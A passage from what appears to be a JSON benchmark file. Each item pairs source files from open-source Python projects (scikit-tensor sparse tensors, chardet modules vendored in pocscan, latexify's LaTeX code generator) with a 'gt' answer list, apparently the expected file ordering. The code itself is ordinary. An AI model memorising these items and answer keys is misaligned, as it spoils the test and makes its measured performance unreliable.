subs\n        self.vals = vals\n        self.dtype = dtype\n        self.issorted = issorted\n        self.accumfun = accumfun\n\n        if shape is None:\n            self.shape = tuple(array(subs).max(axis=1).flatten() + 1)\n        else:\n            self.shape = tuple(int(d) for d in shape)\n        self.ndim = len(subs)\n\n    def __eq__(self, other):\n        if isinstance(other, sptensor):\n            self._sort()\n            other._sort()\n            return (self.vals == other.vals).all() and (array(self.subs) == array(other.subs)).all()\n        elif isinstance(other, np.ndarray):\n            return (self.toarray() == other).all()\n        else:\n            raise NotImplementedError('Unsupported object class for sptensor.__eq__ (%s)' % type(other))\n\n    def __getitem__(self, idx):\n\n        if len(idx) != self.ndim:\n            raise ValueError('subscripts must be complete')\n        sidx = ones(len(self.vals))\n        for i in range(self.ndim):\n            sidx = np.logical_and(self.subs[i] == idx[i], sidx)\n        vals = self.vals[sidx]\n        if len(vals) == 0:\n            vals = 0\n        elif len(vals) > 1:\n            if self.accumfun is None:\n                raise ValueError('Duplicate entries without specified accumulation function')\n            vals = self.accumfun(vals)\n        return vals\n\n    def __sub__(self, other):\n        if isinstance(other, np.ndarray):\n            res = -other\n            res[self.subs] += self.vals\n        else:\n            raise NotImplementedError()\n        return res\n\n    def _sort(self):\n\n        subs = array(self.subs)\n        sidx = lexsort(subs)\n        self.subs = tuple(z.flatten()[sidx] for z in vsplit(subs, len(self.shape)))\n        self.vals = self.vals[sidx]\n        self.issorted = True\n\n    def _ttm_compute(self, V, mode, transp):\n        Z = self.unfold(mode, transp=True).tocsr()\n        if transp:\n            V = V.T\n        Z = Z.dot(V.T)\n        shape = copy(self.shape)\n        shape[mode] = V.shape[0]\n        if issparse_mat(Z):\n            newT = unfolded_sptensor((Z.data, (Z.row, Z.col)), [mode], None, shape=shape).fold()\n        else:\n            newT = unfolded_dtensor(Z.T, mode, shape).fold()\n\n        return newT\n\n    def _ttv_compute(self, v, dims, vidx, remdims):\n        nvals = self.vals\n        nsubs = self.subs\n        for i in range(len(dims)):\n            idx = nsubs[dims[i]]\n            w = v[vidx[i]]\n            nvals = nvals * w[idx]\n\n\n        if len(remdims) == 0:\n            return nvals.sum()\n\n        nsubs = tuple(self.subs[i] for i in remdims)\n        nshp = tuple(self.shape[i] for i in remdims)\n\n\n        if len(remdims) == 1:\n            usubs = unique(nsubs[0])\n            bins = usubs.searchsorted(nsubs[0])\n            c = bincount(bins, weights=nvals)\n            (nz,) = c.nonzero()\n            return sptensor((usubs[nz],), c[nz], nshp)\n\n\n        return sptensor(nsubs, nvals, shape=nshp, accumfun=np.sum)\n\n    def _ttm_me_compute(self, V, edims, sdims, transp):\n\n        shapeY = np.copy(self.shape)\n\n\n        for n in np.union1d(edims, sdims):\n            shapeY[n] = V[n].shape[1] if transp else V[n].shape[0]\n\n\n        Y = zeros(shapeY)\n        shapeY = array(shapeY)\n        v = [None for _ in range(len(edims))]\n\n        for i in range(np.prod(shapeY[edims])):\n            rsubs = unravel_index(shapeY[edims], i)\n\n    def unfold(self, rdims, cdims=None, transp=False):\n        if isinstance(rdims, type(1)):\n            rdims = [rdims]\n        if transp:\n            cdims = rdims\n            rdims = setdiff1d(range(self.ndim), cdims)[::-1]\n        elif cdims is None:\n            cdims = setdiff1d(range(self.ndim), rdims)[::-1]\n        if not (arange(self.ndim) == sort(hstack((rdims, cdims)))).all():\n            raise ValueError(\n                'Incorrect specification of dimensions (rdims: %s, cdims: %s)'\n                % (str(rdims), str(cdims))\n            )\n        M = prod([self.shape[r] for r in rdims])\n        N = prod([self.shape[c] for c in cdims])\n        ridx = _build_idx(self.subs, self.vals, rdims, self.shape)\n        cidx = _build_idx(self.subs, self.vals, cdims, self.shape)\n        return unfolded_sptensor((self.vals, (ridx, cidx)), (M, N), rdims, cdims, self.shape)\n\n    @inherit_docstring_from(tensor_mixin)\n    def uttkrp(self, U, mode):\n        R = U[1].shape[1] if mode == 0 else U[0].shape[1]\n\n        dims = from_to_without(0, self.ndim, mode)\n        V = zeros((self.shape[mode], R))\n        for r in range(R):\n            Z = tuple(U[n][:, r] for n in dims)\n            TZ = self.ttv(Z, mode, without=True)\n            if isinstance(TZ, sptensor):\n                V[TZ.subs, r] = TZ.vals\n            else:\n                V[:, r] = self.ttv(Z, mode, without=True)\n        return V\n\n    @inherit_docstring_from(tensor_mixin)\n    def transpose(self, axes=None):\n\n        if axes is None:\n            raise NotImplementedError(\n                'Sparse tensor transposition without axes argument is not supported'\n            )\n        nsubs = tuple([self.subs[idx] for idx in axes])\n        nshape = [self.shape[idx] for idx in axes]\n        return sptensor(nsubs, self.vals, nshape)\n\n    def concatenate(self, tpl, axis=None):\n\n        if axis is None:\n            raise NotImplementedError(\n                'Sparse tensor concatenation without axis argument is not supported'\n            )\n        T = self\n        for i in range(1, len(tpl)):\n            T = _single_concatenate(T, tpl[i], axis=axis)\n        return T\n\n    def norm(self):\n\n        return np.linalg.norm(self.vals)\n\n    def toarray(self):\n        A = zeros(self.shape)\n        A.put(ravel_multi_index(self.subs, tuple(self.shape)), self.vals)\n        return A\n\n\nclass unfolded_sptensor(coo_matrix):\n\n\n    def __init__(self, tpl, shape, rdims, cdims, ten_shape, dtype=None, copy=False):\n        self.ten_shape = array(ten_shape)\n        if isinstance(rdims, int):\n            rdims = [rdims]\n        if cdims is None:\n            cdims = setdiff1d(range(len(self.ten_shape)), rdims)[::-1]\n        self.rdims = rdims\n        self.cdims = cdims\n        super(unfolded_sptensor, self).__init__(tpl, shape=shape, dtype=dtype, copy=copy)\n\n    def fold(self):\n\n        nsubs = zeros((len(self.data), len(self.ten_shape)), dtype=np.int)\n        if len(self.rdims) > 0:\n            nidx = unravel_index(self.row, self.ten_shape[self.rdims])\n            for i in range(len(self.rdims)):\n                nsubs[:, self.rdims[i]] = nidx[i]\n        if len(self.cdims) > 0:\n            nidx = unravel_index(self.col, self.ten_shape[self.cdims])\n            for i in range(len(self.cdims)):\n                nsubs[:, self.cdims[i]] = nidx[i]\n        nsubs = [z.flatten() for z in hsplit(nsubs, len(self.ten_shape))]\n        return sptensor(tuple(nsubs), self.data, self.ten_shape)\n\n\ndef fromarray(A):\n\n    subs = np.nonzero(A)\n    vals = A[subs]\n    return sptensor(subs, vals, shape=A.shape, dtype=A.dtype)\n\n\ndef _single_concatenate(ten, other, axis):\n    tshape = ten.shape\n    oshape = other.shape\n    if len(tshape) != len(oshape):\n        raise ValueError(\"len(tshape) != len(oshape\")\n    oaxes = setdiff1d(range(len(tshape)), [axis])\n    for i in oaxes:\n        if tshape[i] != oshape[i]:\n            raise ValueError(\"Dimensions must match\")\n    nsubs = [None for _ in range(len(tshape))]\n    for i in oaxes:\n        nsubs[i] = np.concatenate((ten.subs[i], other.subs[i]))\n    nsubs[axis] = np.concatenate((\n        ten.subs[axis], other.subs[axis] + tshape[axis]\n    ))\n    nvals = np.concatenate((ten.vals, other.vals))\n    nshape = np.copy(tshape)\n    nshape[axis] = tshape[axis] + oshape[axis]\n    return sptensor(nsubs, nvals, nshape)\n\n\ndef _build_idx(subs, vals, dims, tshape):\n    shape = array([tshape[d] for d in dims], ndmin=1)\n    dims = array(dims, ndmin=1)\n    if len(shape) == 0:\n        idx = ones(len(vals), dtype=vals.dtype)\n    elif len(subs) == 0:\n        idx = array(tuple())\n    else:\n        idx = ravel_multi_index(tuple(subs[i] for i in dims), shape)\n    return idx\n",
        "gt": [
            "'scikit-tensor/sktensor/pyutils.py'",
            "'scikit-tensor/sktensor/sptensor.py'",
            "'scikit-tensor/sktensor/tests/test_base.py'"
        ]
    },
    {
        "files": [
            "'pocscan/pocscan/plugins/pocsuite/packages/requests/packages/chardet/sbcsgroupprober.py'",
            "'pocscan/pocscan/plugins/pocsuite/packages/requests/packages/chardet/charsetprober.py'",
            "'pocscan/pocscan/plugins/pocsuite/packages/requests/packages/chardet/sbcharsetprober.py'",
            "'pocscan/pocscan/plugins/pocsuite/packages/requests/packages/chardet/universaldetector.py'"
        ],
        "content": "'pocscan/pocscan/plugins/pocsuite/packages/requests/packages/chardet/sbcsgroupprober.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom .charsetgroupprober import CharSetGroupProber\nfrom .sbcharsetprober import SingleByteCharSetProber\nfrom .langcyrillicmodel import (Win1251CyrillicModel, Koi8rModel,\n                                Latin5CyrillicModel, MacCyrillicModel,\n                                Ibm866Model, Ibm855Model)\nfrom .langgreekmodel import Latin7GreekModel, Win1253GreekModel\nfrom .langbulgarianmodel import Latin5BulgarianModel, Win1251BulgarianModel\nfrom .langhungarianmodel import Latin2HungarianModel, Win1250HungarianModel\nfrom .langthaimodel import TIS620ThaiModel\nfrom .langhebrewmodel import Win1255HebrewModel\nfrom .hebrewprober import HebrewProber\n\n\nclass SBCSGroupProber(CharSetGroupProber):\n    def __init__(self):\n        CharSetGroupProber.__init__(self)\n        self._mProbers = [\n            SingleByteCharSetProber(Win1251CyrillicModel),\n            SingleByteCharSetProber(Koi8rModel),\n            SingleByteCharSetProber(Latin5CyrillicModel),\n            SingleByteCharSetProber(MacCyrillicModel),\n            SingleByteCharSetProber(Ibm866Model),\n            SingleByteCharSetProber(Ibm855Model),\n            SingleByteCharSetProber(Latin7GreekModel),\n            SingleByteCharSetProber(Win1253GreekModel),\n            SingleByteCharSetProber(Latin5BulgarianModel),\n            SingleByteCharSetProber(Win1251BulgarianModel),\n            SingleByteCharSetProber(Latin2HungarianModel),\n            SingleByteCharSetProber(Win1250HungarianModel),\n            SingleByteCharSetProber(TIS620ThaiModel),\n        ]\n        hebrewProber = HebrewProber()\n        logicalHebrewProber = SingleByteCharSetProber(Win1255HebrewModel,\n                                                      False, hebrewProber)\n        visualHebrewProber = SingleByteCharSetProber(Win1255HebrewModel, True,\n                                                     hebrewProber)\n        hebrewProber.set_model_probers(logicalHebrewProber, visualHebrewProber)\n        self._mProbers.extend([hebrewProber, logicalHebrewProber,\n                               visualHebrewProber])\n\n        self.reset()\n\n'pocscan/pocscan/plugins/pocsuite/packages/requests/packages/chardet/charsetprober.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom . import constants\nimport re\n\n\nclass CharSetProber:\n    def __init__(self):\n        pass\n\n    def reset(self):\n        self._mState = constants.eDetecting\n\n    def get_charset_name(self):\n        return None\n\n    def feed(self, aBuf):\n        pass\n\n    def get_state(self):\n        return self._mState\n\n    def get_confidence(self):\n        return 0.0\n\n    def filter_high_bit_only(self, aBuf):\n        aBuf = re.sub(b'([\\x00-\\x7F])+', b' ', aBuf)\n        return aBuf\n\n    def filter_without_english_letters(self, aBuf):\n        aBuf = re.sub(b'([A-Za-z])+', b' ', aBuf)\n        return aBuf\n\n    def filter_with_english_letters(self, aBuf):\n\n        return aBuf\n\n'pocscan/pocscan/plugins/pocsuite/packages/requests/packages/chardet/sbcharsetprober.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nimport sys\nfrom . import constants\nfrom .charsetprober import CharSetProber\nfrom .compat import wrap_ord\n\nSAMPLE_SIZE = 64\nSB_ENOUGH_REL_THRESHOLD = 1024\nPOSITIVE_SHORTCUT_THRESHOLD = 0.95\nNEGATIVE_SHORTCUT_THRESHOLD = 0.05\nSYMBOL_CAT_ORDER = 250\nNUMBER_OF_SEQ_CAT = 4\nPOSITIVE_CAT = NUMBER_OF_SEQ_CAT - 1\n\n\n\nclass SingleByteCharSetProber(CharSetProber):\n    def __init__(self, model, reversed=False, nameProber=None):\n        CharSetProber.__init__(self)\n        self._mModel = model\n\n        self._mReversed = reversed\n\n        self._mNameProber = nameProber\n        self.reset()\n\n    def reset(self):\n        CharSetProber.reset(self)\n\n        self._mLastOrder = 255\n        self._mSeqCounters = [0] * NUMBER_OF_SEQ_CAT\n        self._mTotalSeqs = 0\n        self._mTotalChar = 0\n\n        self._mFreqChar = 0\n\n    def get_charset_name(self):\n        if self._mNameProber:\n            return self._mNameProber.get_charset_name()\n        else:\n            return self._mModel['charsetName']\n\n    def feed(self, aBuf):\n        if not self._mModel['keepEnglishLetter']:\n            aBuf = self.filter_without_english_letters(aBuf)\n        aLen = len(aBuf)\n        if not aLen:\n            return self.get_state()\n        for c in aBuf:\n            order = self._mModel['charToOrderMap'][wrap_ord(c)]\n            if order < SYMBOL_CAT_ORDER:\n                self._mTotalChar += 1\n            if order < SAMPLE_SIZE:\n                self._mFreqChar += 1\n                if self._mLastOrder < SAMPLE_SIZE:\n                    self._mTotalSeqs += 1\n                    if not self._mReversed:\n                        i = (self._mLastOrder * SAMPLE_SIZE) + order\n                        model = self._mModel['precedenceMatrix'][i]\n                    else:\n                        i = (order * SAMPLE_SIZE) + self._mLastOrder\n                        model = self._mModel['precedenceMatrix'][i]\n                    self._mSeqCounters[model] += 1\n            self._mLastOrder = order\n\n        if self.get_state() == constants.eDetecting:\n            if self._mTotalSeqs > SB_ENOUGH_REL_THRESHOLD:\n                cf = self.get_confidence()\n                if cf > POSITIVE_SHORTCUT_THRESHOLD:\n                    if constants._debug:\n                        sys.stderr.write('%s confidence = %s, we have a'\n                                         'winner\\n' %\n                                         (self._mModel['charsetName'], cf))\n                    self._mState = constants.eFoundIt\n                elif cf < NEGATIVE_SHORTCUT_THRESHOLD:\n                    if constants._debug:\n                        sys.stderr.write('%s confidence = %s, below negative'\n                                         'shortcut threshhold %s\\n' %\n                                         (self._mModel['charsetName'], cf,\n                                          NEGATIVE_SHORTCUT_THRESHOLD))\n                    self._mState = constants.eNotMe\n\n        return self.get_state()\n\n    def get_confidence(self):\n        r = 0.01\n        if self._mTotalSeqs > 0:\n            r = ((1.0 * self._mSeqCounters[POSITIVE_CAT]) / self._mTotalSeqs\n                 / self._mModel['mTypicalPositiveRatio'])\n            r = r * self._mFreqChar / self._mTotalChar\n            if r >= 1.0:\n                r = 0.99\n        return r\n\n'pocscan/pocscan/plugins/pocsuite/packages/requests/packages/chardet/universaldetector.py'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfrom . import constants\nimport sys\nimport codecs\nfrom .latin1prober import Latin1Prober\nfrom .mbcsgroupprober import MBCSGroupProber\nfrom .sbcsgroupprober import SBCSGroupProber\nfrom .escprober import EscCharSetProber\nimport re\n\nMINIMUM_THRESHOLD = 0.20\nePureAscii = 0\neEscAscii = 1\neHighbyte = 2\n\n\nclass UniversalDetector:\n    def __init__(self):\n        self._highBitDetector = re.compile(b'[\\x80-\\xFF]')\n        self._escDetector = re.compile(b'(\\033|~{)')\n        self._mEscCharSetProber = None\n        self._mCharSetProbers = []\n        self.reset()\n\n    def reset(self):\n        self.result = {'encoding': None, 'confidence': 0.0}\n        self.done = False\n        self._mStart = True\n        self._mGotData = False\n        self._mInputState = ePureAscii\n        self._mLastChar = b''\n        if self._mEscCharSetProber:\n            self._mEscCharSetProber.reset()\n        for prober in self._mCharSetProbers:\n            prober.reset()\n\n    def feed(self, aBuf):\n        if self.done:\n            return\n\n        aLen = len(aBuf)\n        if not aLen:\n            return\n\n        if not self._mGotData:\n\n            if aBuf[:3] == codecs.BOM:\n\n                self.result = {'encoding': \"UTF-8\", 'confidence': 1.0}\n            elif aBuf[:4] == codecs.BOM_UTF32_LE:\n\n                self.result = {'encoding': \"UTF-32LE\", 'confidence': 1.0}\n            elif aBuf[:4] == codecs.BOM_UTF32_BE:\n\n                self.result = {'encoding': \"UTF-32BE\", 'confidence': 1.0}\n            elif aBuf[:4] == b'\\xFE\\xFF\\x00\\x00':\n\n                self.result = {\n                    'encoding': \"X-ISO-10646-UCS-4-3412\",\n                    'confidence': 1.0\n                }\n            elif aBuf[:4] == b'\\x00\\x00\\xFF\\xFE':\n\n                self.result = {\n                    'encoding': \"X-ISO-10646-UCS-4-2143\",\n                    'confidence': 1.0\n                }\n            elif aBuf[:2] == codecs.BOM_LE:\n\n                self.result = {'encoding': \"UTF-16LE\", 'confidence': 1.0}\n            elif aBuf[:2] == codecs.BOM_BE:\n\n                self.result = {'encoding': \"UTF-16BE\", 'confidence': 1.0}\n\n        self._mGotData = True\n        if self.result['encoding'] and (self.result['confidence'] > 0.0):\n            self.done = True\n            return\n\n        if self._mInputState == ePureAscii:\n            if self._highBitDetector.search(aBuf):\n                self._mInputState = eHighbyte\n            elif ((self._mInputState == ePureAscii) and\n                    self._escDetector.search(self._mLastChar + aBuf)):\n                self._mInputState = eEscAscii\n\n        self._mLastChar = aBuf[-1:]\n\n        if self._mInputState == eEscAscii:\n            if not self._mEscCharSetProber:\n                self._mEscCharSetProber = EscCharSetProber()\n            if self._mEscCharSetProber.feed(aBuf) == constants.eFoundIt:\n                self.result = {'encoding': self._mEscCharSetProber.get_charset_name(),\n                               'confidence': self._mEscCharSetProber.get_confidence()}\n                self.done = True\n        elif self._mInputState == eHighbyte:\n            if not self._mCharSetProbers:\n                self._mCharSetProbers = [MBCSGroupProber(), SBCSGroupProber(),\n                                         Latin1Prober()]\n            for prober in self._mCharSetProbers:\n                if prober.feed(aBuf) == constants.eFoundIt:\n                    self.result = {'encoding': prober.get_charset_name(),\n                                   'confidence': prober.get_confidence()}\n                    self.done = True\n                    break\n\n    def close(self):\n        if self.done:\n            return\n        if not self._mGotData:\n            if constants._debug:\n                sys.stderr.write('no data received!\\n')\n            return\n        self.done = True\n\n        if self._mInputState == ePureAscii:\n            self.result = {'encoding': 'ascii', 'confidence': 1.0}\n            return self.result\n\n        if self._mInputState == eHighbyte:\n            proberConfidence = None\n            maxProberConfidence = 0.0\n            maxProber = None\n            for prober in self._mCharSetProbers:\n                if not prober:\n                    continue\n                proberConfidence = prober.get_confidence()\n                if proberConfidence > maxProberConfidence:\n                    maxProberConfidence = proberConfidence\n                    maxProber = prober\n            if maxProber and (maxProberConfidence > MINIMUM_THRESHOLD):\n                self.result = {'encoding': maxProber.get_charset_name(),\n                               'confidence': maxProber.get_confidence()}\n                return self.result\n\n        if constants._debug:\n            sys.stderr.write('no probers hit minimum threshhold\\n')\n            for prober in self._mCharSetProbers[0].mProbers:\n                if not prober:\n                    continue\n                sys.stderr.write('%s confidence = %s\\n' %\n                                 (prober.get_charset_name(),\n                                  prober.get_confidence()))\n",
        "gt": [
            "'pocscan/pocscan/plugins/pocsuite/packages/requests/packages/chardet/charsetprober.py'",
            "'pocscan/pocscan/plugins/pocsuite/packages/requests/packages/chardet/sbcharsetprober.py'",
            "'pocscan/pocscan/plugins/pocsuite/packages/requests/packages/chardet/sbcsgroupprober.py'",
            "'pocscan/pocscan/plugins/pocsuite/packages/requests/packages/chardet/universaldetector.py'"
        ]
    },
    {
        "files": [
            "'latexify_py/src/latexify/codegen/algorithmic_codegen.py'",
            "'latexify_py/src/latexify/codegen/__init__.py'",
            "'latexify_py/src/latexify/__init__.py'",
            "'latexify_py/src/latexify/generate_latex.py'"
        ],
        "content": "'latexify_py/src/latexify/codegen/algorithmic_codegen.py'\n:\n\nfrom __future__ import annotations\n\nimport ast\nimport contextlib\nfrom collections.abc import Generator\n\nfrom latexify import exceptions\nfrom latexify.codegen import expression_codegen, identifier_converter\n\n\nclass AlgorithmicCodegen(ast.NodeVisitor):\n\n\n    _SPACES_PER_INDENT = 4\n\n    _identifier_converter: identifier_converter.IdentifierConverter\n    _indent_level: int\n\n    def __init__(\n        self, *, use_math_symbols: bool = False, use_set_symbols: bool = False\n    ) -> None:\n        \"\"\"Initializer.\n\n        Args:\n            use_math_symbols: Whether to convert identifiers with a math symbol surface\n                (e.g., \"alpha\") to the LaTeX symbol (e.g., \"\\\\alpha\").\n            use_set_symbols: Whether to use set symbols or not.\n        \"\"\"\n        self._expression_codegen = expression_codegen.ExpressionCodegen(\n            use_math_symbols=use_math_symbols, use_set_symbols=use_set_symbols\n        )\n        self._identifier_converter = identifier_converter.IdentifierConverter(\n            use_math_symbols=use_math_symbols,\n            use_mathrm=False,\n        )\n        self._indent_level = 0\n\n    def generic_visit(self, node: ast.AST) -> str:\n        raise exceptions.LatexifyNotSupportedError(\n            f\"Unsupported AST: {type(node).__name__}\"\n        )\n\n    def visit_Assign(self, node: ast.Assign) -> str:\n\n        operands: list[str] = [\n            self._expression_codegen.visit(target) for target in node.targets\n        ]\n        operands.append(self._expression_codegen.visit(node.value))\n        operands_latex = r\" \\gets \".join(operands)\n        return self._add_indent(rf\"\\State ${operands_latex}$\")\n\n    def visit_Expr(self, node: ast.Expr) -> str:\n\n        return self._add_indent(\n            rf\"\\State ${self._expression_codegen.visit(node.value)}$\"\n        )\n\n    def visit_For(self, node: ast.For) -> str:\n\n        if len(node.orelse) != 0:\n            raise exceptions.LatexifyNotSupportedError(\n                \"For statement with the else clause is not supported\"\n            )\n\n        target_latex = self._expression_codegen.visit(node.target)\n        iter_latex = self._expression_codegen.visit(node.iter)\n        with self._increment_level():\n            body_latex = \"\\n\".join(self.visit(stmt) for stmt in node.body)\n\n        return (\n            self._add_indent(f\"\\\\For{{${target_latex} \\\\in {iter_latex}$}}\\n\")\n            + f\"{body_latex}\\n\"\n            + self._add_indent(\"\\\\EndFor\")\n        )\n\n\n    def visit_FunctionDef(self, node: ast.FunctionDef) -> str:\n\n        name_latex = self._identifier_converter.convert(node.name)[0]\n\n\n        arg_strs = [\n            self._identifier_converter.convert(arg.arg)[0] for arg in node.args.args\n        ]\n\n        latex = self._add_indent(\"\\\\begin{algorithmic}\\n\")\n        with self._increment_level():\n            latex += self._add_indent(\n                f\"\\\\Function{{{name_latex}}}{{${', '.join(arg_strs)}$}}\\n\"\n            )\n\n            with self._increment_level():\n\n                body_strs: list[str] = [self.visit(stmt) for stmt in node.body]\n            body_latex = \"\\n\".join(body_strs)\n\n            latex += f\"{body_latex}\\n\"\n            latex += self._add_indent(\"\\\\EndFunction\\n\")\n        return latex + self._add_indent(r\"\\end{algorithmic}\")\n\n\n    def visit_If(self, node: ast.If) -> str:\n\n        cond_latex = self._expression_codegen.visit(node.test)\n        with self._increment_level():\n            body_latex = \"\\n\".join(self.visit(stmt) for stmt in node.body)\n\n        latex = self._add_indent(f\"\\\\If{{${cond_latex}$}}\\n\" + body_latex)\n\n        if node.orelse:\n            latex += \"\\n\" + self._add_indent(\"\\\\Else\\n\")\n            with self._increment_level():\n                latex += \"\\n\".join(self.visit(stmt) for stmt in node.orelse)\n\n        return f\"{latex}\\n\" + self._add_indent(r\"\\EndIf\")\n\n    def visit_Module(self, node: ast.Module) -> str:\n\n        return self.visit(node.body[0])\n\n    def visit_Return(self, node: ast.Return) -> str:\n\n        return (\n            self._add_indent(\n                rf\"\\State \\Return ${self._expression_codegen.visit(node.value)}$\"\n            )\n            if node.value is not None\n            else self._add_indent(r\"\\State \\Return\")\n        )\n\n    def visit_While(self, node: ast.While) -> str:\n\n        if node.orelse:\n            raise exceptions.LatexifyNotSupportedError(\n                \"While statement with the else clause is not supported\"\n            )\n\n        cond_latex = self._expression_codegen.visit(node.test)\n        with self._increment_level():\n            body_latex = \"\\n\".join(self.visit(stmt) for stmt in node.body)\n        return (\n            self._add_indent(f\"\\\\While{{${cond_latex}$}}\\n\")\n            + f\"{body_latex}\\n\"\n            + self._add_indent(r\"\\EndWhile\")\n        )\n\n    def visit_Pass(self, node: ast.Pass) -> str:\n\n        return self._add_indent(r\"\\State $\\mathbf{pass}$\")\n\n    def visit_Break(self, node: ast.Break) -> str:\n\n        return self._add_indent(r\"\\State $\\mathbf{break}$\")\n\n    def visit_Continue(self, node: ast.Continue) -> str:\n\n        return self._add_indent(r\"\\State $\\mathbf{continue}$\")\n\n    @contextlib.contextmanager\n    def _increment_level(self) -> Generator[None, None, None]:\n\n        self._indent_level += 1\n        yield\n        self._indent_level -= 1\n\n    def _add_indent(self, line: str) -> str:\n\n        return self._indent_level * self._SPACES_PER_INDENT * \" \" + line\n\n\nclass IPythonAlgorithmicCodegen(ast.NodeVisitor):\n\n\n    _EM_PER_INDENT = 1\n    _LINE_BREAK = r\" \\\\ \"\n\n    _identifier_converter: identifier_converter.IdentifierConverter\n    _indent_level: int\n\n    def __init__(\n        self, *, use_math_symbols: bool = False, use_set_symbols: bool = False\n    ) -> None:\n        \"\"\"Initializer.\n\n        Args:\n            use_math_symbols: Whether to convert identifiers with a math symbol surface\n                (e.g., \"alpha\") to the LaTeX symbol (e.g., \"\\\\alpha\").\n            use_set_symbols: Whether to use set symbols or not.\n        \"\"\"\n        self._expression_codegen = expression_codegen.ExpressionCodegen(\n            use_math_symbols=use_math_symbols, use_set_symbols=use_set_symbols\n        )\n        self._identifier_converter = identifier_converter.IdentifierConverter(\n            use_math_symbols=use_math_symbols\n        )\n        self._indent_level = 0\n\n    def generic_visit(self, node: ast.AST) -> str:\n        raise exceptions.LatexifyNotSupportedError(\n            f\"Unsupported AST: {type(node).__name__}\"\n        )\n\n    def visit_Assign(self, node: ast.Assign) -> str:\n\n        operands: list[str] = [\n            self._expression_codegen.visit(target) for target in node.targets\n        ]\n        operands.append(self._expression_codegen.visit(node.value))\n        operands_latex = r\" \\gets \".join(operands)\n        return self._add_indent(operands_latex)\n\n    def visit_Expr(self, node: ast.Expr) -> str:\n\n        return self._add_indent(self._expression_codegen.visit(node.value))\n\n    def visit_For(self, node: ast.For) -> str:\n\n        if len(node.orelse) != 0:\n            raise exceptions.LatexifyNotSupportedError(\n                \"For statement with the else clause is not supported\"\n            )\n\n        target_latex = self._expression_codegen.visit(node.target)\n        iter_latex = self._expression_codegen.visit(node.iter)\n        with self._increment_level():\n            body_latex = self._LINE_BREAK.join(self.visit(stmt) for stmt in node.body)\n\n        return (\n            self._add_indent(r\"\\mathbf{for}\")\n            + rf\" \\ {target_latex} \\in {iter_latex} \\ \\mathbf{{do}}{self._LINE_BREAK}\"\n            + f\"{body_latex}{self._LINE_BREAK}\"\n            + self._add_indent(r\"\\mathbf{end \\ for}\")\n        )\n\n\n    def visit_FunctionDef(self, node: ast.FunctionDef) -> str:\n\n        name_latex = self._identifier_converter.convert(node.name)[0]\n\n\n        args_latex = [\n            self._identifier_converter.convert(arg.arg)[0] for arg in node.args.args\n        ]\n\n        with self._increment_level():\n            body_stmts_latex: list[str] = [self.visit(stmt) for stmt in node.body]\n        body_latex = self._LINE_BREAK.join(body_stmts_latex)\n\n        return (\n            r\"\\begin{array}{l} \"\n            + self._add_indent(r\"\\mathbf{function}\")\n            + rf\" \\ {name_latex}({', '.join(args_latex)})\"\n            + f\"{self._LINE_BREAK}{body_latex}{self._LINE_BREAK}\"\n            + self._add_indent(r\"\\mathbf{end \\ function}\")\n            + r\" \\end{array}\"\n        )\n\n\n    def visit_If(self, node: ast.If) -> str:\n\n        cond_latex = self._expression_codegen.visit(node.test)\n        with self._increment_level():\n            body_latex = self._LINE_BREAK.join(self.visit(stmt) for stmt in node.body)\n        latex = self._add_indent(\n            rf\"\\mathbf{{if}} \\ {cond_latex}{self._LINE_BREAK}{body_latex}\"\n        )\n\n        if node.orelse:\n            latex += self._LINE_BREAK + self._add_indent(r\"\\mathbf{else} \\\\ \")\n            with self._increment_level():\n                latex += self._LINE_BREAK.join(self.visit(stmt) for stmt in node.orelse)\n\n        return latex + self._LINE_BREAK + self._add_indent(r\"\\mathbf{end \\ if}\")\n\n    def visit_Module(self, node: ast.Module) -> str:\n\n        return self.visit(node.body[0])\n\n    def visit_Return(self, node: ast.Return) -> str:\n\n        return (\n            self._add_indent(r\"\\mathbf{return} \\ \")\n            + self._expression_codegen.visit(node.value)\n            if node.value is not None\n            else self._add_indent(r\"\\mathbf{return}\")\n        )\n\n    def visit_While(self, node: ast.While) -> str:\n\n        if node.orelse:\n            raise exceptions.LatexifyNotSupportedError(\n                \"While statement with the else clause is not supported\"\n            )\n\n        cond_latex = self._expression_codegen.visit(node.test)\n        with self._increment_level():\n            body_latex = self._LINE_BREAK.join(self.visit(stmt) for stmt in node.body)\n        return (\n            self._add_indent(r\"\\mathbf{while} \\ \")\n            + f\"{cond_latex}{self._LINE_BREAK}{body_latex}{self._LINE_BREAK}\"\n            + self._add_indent(r\"\\mathbf{end \\ while}\")\n        )\n\n    def visit_Pass(self, node: ast.Pass) -> str:\n\n        return self._add_indent(r\"\\mathbf{pass}\")\n\n    def visit_Break(self, node: ast.Break) -> str:\n\n        return self._add_indent(r\"\\mathbf{break}\")\n\n    def visit_Continue(self, node: ast.Continue) -> str:\n\n        return self._add_indent(r\"\\mathbf{continue}\")\n\n    @contextlib.contextmanager\n    def _increment_level(self) -> Generator[None, None, None]:\n\n        self._indent_level += 1\n        yield\n        self._indent_level -= 1\n\n    def _add_indent(self, line: str) -> str:\n\n        return (\n            rf\"\\hspace{{{self._indent_level * self._EM_PER_INDENT}em}} {line}\"\n            if self._indent_level > 0\n            else line\n        )\n\n'latexify_py/src/latexify/codegen/__init__.py'\n:\n\nfrom latexify.codegen import algorithmic_codegen, expression_codegen, function_codegen\n\nAlgorithmicCodegen = algorithmic_codegen.AlgorithmicCodegen\nExpressionCodegen = expression_codegen.ExpressionCodegen\nFunctionCodegen = function_codegen.FunctionCodegen\nIPythonAlgorithmicCodegen = algorithmic_codegen.IPythonAlgorithmicCodegen\n\n'latexify_py/src/latexify/__init__.py'\n:\n\ntry:\n    from latexify import _version\n\n    __version__ = _version.__version__\nexcept Exception:\n    __version__ = \"\"\n\nfrom latexify import frontend, generate_latex\n\nStyle = generate_latex.Style\n\nget_latex = generate_latex.get_latex\n\nalgorithmic = frontend.algorithmic\nexpression = frontend.expression\nfunction = frontend.function\n\n'latexify_py/src/latexify/generate_latex.py'\n:\n\nfrom __future__ import annotations\n\nimport enum\nfrom collections.abc import Callable\nfrom typing import Any\n\nfrom latexify import codegen\nfrom latexify import config as cfg\nfrom latexify import parser, transformers\n\n\nclass Style(enum.Enum):\n\n\n    